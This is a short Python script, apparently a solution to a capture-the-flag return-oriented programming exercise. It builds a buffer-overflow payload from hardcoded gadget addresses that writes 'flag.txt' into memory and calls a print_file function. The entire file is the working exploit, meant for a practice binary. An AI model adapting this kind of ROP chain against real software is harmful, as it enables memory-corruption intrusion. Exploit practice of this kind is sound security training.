import struct
import sys

padding = b"A" * 40

_data = struct.pack("Q", 0x00601028)
pop_rdi_ret = struct.pack("Q", 0x0000000000400693)
pop_r14_r15_ret = struct.pack("Q", 0x0000000000400690)
mov_r14_r15_ret = struct.pack("Q", 0x0000000000400628)
print_file = struct.pack("Q", 0x00400510)

exploit = pop_rdi_ret + _data+ print_file

payload = padding + pop_r14_r15_ret + _data + b"flag.txt" + mov_r14_r15_ret + exploit

if sys.version_info[0] == 3:
      sys.stdout.buffer.write(payload)
else:
    print(payload)
